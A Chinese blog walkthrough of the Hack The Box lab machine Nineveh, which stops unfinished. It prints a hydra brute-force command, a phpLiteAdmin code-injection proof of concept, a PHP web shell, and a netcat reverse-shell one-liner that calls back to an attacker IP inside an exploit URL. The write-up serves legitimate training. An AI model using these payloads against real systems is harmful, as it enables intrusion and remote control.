---
title: Nineveh
date: 2021-10-18
swiper: false # 将改文章放入轮播图中
swiperImg: '/medias/1.jpg' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片
img: 'http://cdn.mxrblog.cn/ct_22.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片
categories: walkthrough
tags: [渗透测试, 靶机]
top: false
---

# Nineveh

- **Nineveh是hackthebox上中等难度的靶机**

### 端口扫描

- 首先进行nmap端口扫描和漏洞检测

![image-20211018165809587](http://cdn.mxrblog.cn/image-20211018165809587.png)

- 登录80端口，没有发现什么信息

![image-20211018170313253](http://cdn.mxrblog.cn/image-20211018170313253.png)



#### 图片处理（1）

- 打开443号端口发现了一张图片

![image-20211018170359675](http://cdn.mxrblog.cn/image-20211018170359675.png)

- 使用隐写工具steghide并没有发现图片中存在什么东西
- 使用strings处理照片也没有结果

![image-20211018173430595](http://cdn.mxrblog.cn/image-20211018173430595.png)



- 将nineveh.htb 添加到hosts文件中， 并使用命令`host -l nineveh.htb 10.10.10.43` 查看是否还有其他的域名存在

- 但是一无所获

![image-20211018171606855](http://cdn.mxrblog.cn/image-20211018171606855.png)



### gobuster信息收集

- 再使用gobuster探测http://10.10.10.43 和https://10.10.10.43

![image-20211018230436868](http://cdn.mxrblog.cn/image-20211018230436868.png)



#### http://10.10.10.43

- 发现http://10.10.10.43/department/  可能会有什么线索

![image-20211018231524999](http://cdn.mxrblog.cn/image-20211018231524999.png)

- 查看网页源代码发现有用户admin

![image-20211018231405809](http://cdn.mxrblog.cn/image-20211018231405809.png)

- 试着对输入框输入用户名和密码，发现存在用户admin 和nineveh

- 注意，账号输入正确，但是密码错误会出现密码错误的提示，账号出现错误会提示账号出错，但不会提示密码输入错误，借此我们可以进行反复的的试探，得出账号

![image-20211018231805365](http://cdn.mxrblog.cn/image-20211018231805365.png)

- 通过brupsuit抓包，找到相关发送线索

![image-20211019011742410](http://cdn.mxrblog.cn/image-20211019011742410.png)

- 使用hydra破解密码

![image-20211019011644389](http://cdn.mxrblog.cn/image-20211019011644389.png)

- 使用得到的账号密码登录

![image-20211019014345169](http://cdn.mxrblog.cn/image-20211019014345169.png)

- 点击上面的Notes选项，发现可能有文件包含漏洞

- 测试后暂且放下，稍后看是否可利用

![image-20211019014702471](http://cdn.mxrblog.cn/image-20211019014702471.png)

- tmp

![image-20211019015405249](http://cdn.mxrblog.cn/image-20211019015405249.png)



#### https://10.10.10.43

- 有个db目录好像存在东西，再次勘察一下

- 浏览器访问https://10.10.10.43/db

![image-20211018174732941](http://cdn.mxrblog.cn/image-20211018174732941.png)

- brupsuit抓包发现线索

![image-20211018232100094](http://cdn.mxrblog.cn/image-20211018232100094.png)

- 用hydra炸一下

```
hydra 10.10.10.43 https-form-post "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -l admin -P /usr/share/wordlists/rockyou.txt
```

![image-20211019000332266](http://cdn.mxrblog.cn/image-20211019000332266.png)



- 使用得到的密码进行登录

![image-20211019020206342](http://cdn.mxrblog.cn/image-20211019020206342.png)

- 使用searchsploit 查看phpLiteAdmin 1.9 版本是否存在漏洞

![image-20211019020421962](http://cdn.mxrblog.cn/image-20211019020421962.png)

- 查看漏洞内容

```
Description:

phpliteadmin.php#1784: 'Creating a New Database' =>
phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',

An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.

Proof of Concept:

1. We create a db named "hack.php".
(Depending on Server configuration sometimes it will not work and the name for the db will be "hack.sqlite". Then simply try to rename the database / existing database to "hack.php".)
The script will store the sqlite database in the same directory as phpliteadmin.php.
Preview: http://goo.gl/B5n9O
Hex preview: http://goo.gl/lJ5iQ

2. Now create a new table in this database and insert a text field with the default value:
<?php phpinfo()?>
Hex preview: http://goo.gl/v7USQ

3. Now we run hack.php

Done!
```

- 按照提示创建名为hack.php的数据库， 并向里面填入攻击代码

```
<?php echo system($_REQUEST["cmd"]); ?>
```

![image-20211019021537092](http://cdn.mxrblog.cn/image-20211019021537092.png)

![image-20211019032019242](http://cdn.mxrblog.cn/image-20211019032019242.png)

![image-20211019032043837](http://cdn.mxrblog.cn/image-20211019032043837.png)

- hack.php无法被执行成功，由于LFI漏洞，数据库名字必须包含ninevehNotes, 所以将数据库重命名为ninevehNotes.php

![image-20211019022747885](http://cdn.mxrblog.cn/image-20211019022747885.png)

- 执行：

![image-20211019032834799](http://cdn.mxrblog.cn/image-20211019032834799.png)

- 我们可以远程执行代码！现在让我们尝试一个反向 shell one liner 连接回我们的4444端口（我们已经准备好用 nc -lvnp 命令监听它。）但是要这样做，我们首先需要对我们的反向 shell one liner 进行 url 编码：

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 4444 >/tmp/f
rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.6+4444+>/tmp/f
```

- 在网页上执行以下代码

`http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.6+4444+%3E/tmp/f`

![image-20211019032955471](http://cdn.mxrblog.cn/image-20211019032955471.png)



- 我们需要提权，并且知道用户amrois

![image-20211019033350059](http://cdn.mxrblog.cn/image-20211019033350059.png)

#### 图片处理（2）

- 查看子目录/secure_notes下是什么

![image-20211019013147990](http://cdn.mxrblog.cn/image-20211019013147990.png)

- 一张图像，保存后使用steghide查看是否有密码隐藏
- 无结果

![image-20211019013451148](http://cdn.mxrblog.cn/image-20211019013451148.png)

- 再次使用strings查看图片

![image-20211019013618492](http://cdn.mxrblog.cn/image-20211019013618492.png)

- 得到某个用户的私匙，创建文件，并将其保存

![image-20211019014030305](http://cdn.mxrblog.cn/image-20211019014030305.png)

### 提权

- 有了id_rsa 和用户名，尝试ssh登录

- 由于ssh端口是关闭的，看看是不是系统开启了knockd服务

![image-20211019035855267](http://cdn.mxrblog.cn/image-20211019035855267.png)

- nmap 依次打开这几个端口

`for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.43; done`

- 从靶机上下载linpeas.sh

![image-20211019034236360](http://cdn.mxrblog.cn/image-20211019034236360.png)

- 运行linpeas.sh





# 后面的过程暂时无法进行，可能是靶机出现了问题导致knock过程失败，22号端口无法打开，等官方反馈中。。。

